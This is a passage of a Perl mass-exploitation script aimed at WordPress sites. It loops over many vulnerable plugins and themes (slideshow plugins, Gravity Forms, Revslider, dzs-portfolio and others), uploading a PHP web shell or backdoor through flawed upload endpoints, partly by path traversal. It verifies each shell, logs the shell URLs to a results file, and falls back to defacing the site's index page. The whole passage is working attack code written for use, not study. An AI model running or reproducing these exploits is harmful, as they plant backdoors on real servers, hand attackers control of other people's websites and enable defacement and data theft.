open (TEXT, '>>Result/Shell.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"yass";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ homepageslideshow #####################
sub homepage(){

my $url = "$site/wp-admin/admin.php?page=homepageslideshow_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'hss_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/homepageslideshow\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/homepageslideshow/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"homepageslideshow";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $levoslideshowup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"homepageslideshow";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ image-news-slider #####################
sub ipage(){

my $url = "$site/wp-admin/admin.php?page=image-news-slider_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'slider_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/image-news-slider\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/image-news-slider/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"image-news-slider";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $levoslideshowup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"image-news-slider";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Bliss-slider #####################
sub bliss(){

my $url = "$site/wp-admin/admin.php?page=unique_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'uni_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/unique\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/unique/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"bliss-news-slider";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $levoslideshowup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"bliss-news-slider";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ xdata-toolkit #####################
sub xdata(){

my $url = "$site/wp-content/plugins/xdata-toolkit/modules/TransformStudio/SaveTransformUpdateView.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => ["xsldata" => '<? xml version = "1.0"?><xsl: stylesheet version = "1.0" xmlns: xsl = "http://www.w3.org/1999/XSL/Transform"><xsl:template match ="/"><html></html></xsl:template></xsl:stylesheet>',e_transform_file => ["files/Izanami.php"],]);

$cherryup="$site/wp-content/plugins/xdata-toolkit/transforms/client/Izanami.php?I=Xploit";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"xdata-toolkit";
print color('bold white')," ----- Exploit ==>. ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $cherryup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$cherryup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"xdata-toolkit";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Power Zoomer #####################
sub powerzoomer(){ 
my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/Izanami.php?I=Xploit";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Power Zoomer";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Power Zoomer";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ foxcontact #####################
sub wofind(){


$foxup="$site/wp-content/plugins/woocommerce-products-filter/languages/woocommerce-products-filter-en_US.po";

my $checkfoxup = $ua->get("$foxup")->content;
if ($checkfoxup =~ /plugin_options.php/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"products-filter";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"FOUND\n";
open (TEXT, '>>Result/woocommerce-products-filter.txt');
print TEXT "$foxup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"products-filter";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"NOT FOUND\n";
}
}

################ m-forms-community #####################
sub mms(){ 
my $url = "$site/wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'fileToUpload' => ["files/Izanami.php"] ]);

if ($response->content =~ /filename: '(.*?)'/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/plugins/mm-forms-community/upload/temp/$uploadfolder";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"mm-forms com";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
mmsdef();
}
}
sub mmsdef(){ 
my $url = "$site/wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'fileToUpload' => ["files/Izanami.html"] ]);

if ($response->content =~ /filename: '(.*?)'/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/plugins/mm-forms-community/upload/temp/$uploadfolder";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"mm-forms com";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"mm-forms com";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}
sub xxsav(){ 
my $url = "$site/wp-content/plugins/developer-tools/libs/swfupload/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'UPLOADDIR'=>'../', 'ADMINEMAIL'=>'test@example.com', 'Filedata' => ["files/Izanmi.php"]]);

$zoomerup="$site//wp-content/plugins/developer-tools/libs/Izanmi.php?I=Xploit";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"developer-tools";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"developer-tools";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

sub xxsd(){ 
my $url = "$site/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'upload-favicon'=>'fake', 'iconImage' => ["files/Izanmi.php"]]);

$zoomerup="$site//wp-content/uploads/favicon/Izanmi.php?I=Xploit";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"genesis-simple";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"genesis-simple";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

sub at1(){ 
my $url = "$site/wp-content/plugins/dzs-portfolio/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'file_field' => ["files/Izanami.PhP.txtx"] ]);

$zoomerup="$site/wp-content/plugins/dzs-portfolio/upload/Izanami.PhP.txtx?I=Xploit";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dzs-portfolio";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
att1();
}
}
sub att1(){ 
my $url = "$site/wp-content/plugins/dzs-portfolio/admin/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'file_field' => ["files/Izanami.PhP.txtx"] ]);

$zoomerup="$site/wp-content/plugins/dzs-portfolio/upload/admin/Izanami.PhP.txtx?I=Xploit";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dzs-portfolio";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dzs-portfolio";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

sub at2(){ 
my $url = "$site/wp-content/plugins/dzs-videogallery/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'file_field' => ["files/Izanami.PhP.txtx"] ]);

$zoomerup="$site/wp-content/plugins/dzs-videogallery/upload/Izanami.PhP.txtx?I=Xploit";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dzs-videogallery";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
at3();
}
}
sub at3(){ 
my $url = "$site/wp-content/plugins/dzs-videogallery/admin/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'file_field' => ["files/Izanami.PhP.txtx"] ]);

$zoomerup="$site/wp-content/plugins/dzs-videogallery/admin/upload/Izanami.PhP.txtx?I=Xploit";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dzs-videogallery";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dzs-videogallery";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Gravity Forms #####################
sub gravityforms(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["files/BackDoor.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);

$gravityformsup = "$site/wp-includes/wp-footer.php?I=Xploit";
my $check = $ua->get("$site/wp-content/uploads/_input_3_css.php.jd")->content;
my $checkk = $ua->get("$site/wp-includes/wp-footer.php")->content;
if($checkk =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Gravity Forms";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $gravityformsup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
}
else{
gravityforms2();
}
}
################ Gravity Forms #####################
sub gravityforms2(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres2 = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["files/index.jpg"], form_id => '1', name => 'Psyco.html', gform_unique_id => '../../../../../', field_id => '3',]);
$gravityformsupp = "$site/_input_3_Psyco.html";
my $checkgravityformsupp = $ua->get("$gravityformsupp")->content;
if ($checkgravityformsupp =~ /HaCKeD/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Gravity Forms";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold red'),"Shell Not Uploaded\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold green'),"  SHELL => $gravityformsupp\n";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$gravityformsupp\n";
close (TEXT);

}
else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Gravity Forms";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ Revslider upload shell #####################
sub revslider(){

my $url = "$site/wp-admin/admin-ajax.php";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $revslidres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["files/Izanamievs.zip"]]);

my $revs = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revavada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revstriking = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revincredible = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revmedicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revcentum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revbeachapollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revcuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revpindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revdesignplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revrarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php")->content;
my $revandre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php")->content;

if($revs =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/plugins/revslider/temp/update_extract/revslider/I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revavada =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}


elsif($revstriking =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revincredible =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revmedicate =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revultimatum =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revcentum =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revbeachapollo =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revcuckootap =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revpindol =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revdesignplus =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revrarebird =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

elsif($revandre =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/Izanami.php?I=Xploit\n";
close (TEXT);
}

else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider Upload Shell";
print color('bold white')," ............ ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
revsliderajax();
}
}
################ Revslider ajax #####################
sub revsliderajax(){

my $url = "$site/wp-admin/admin-ajax.php";

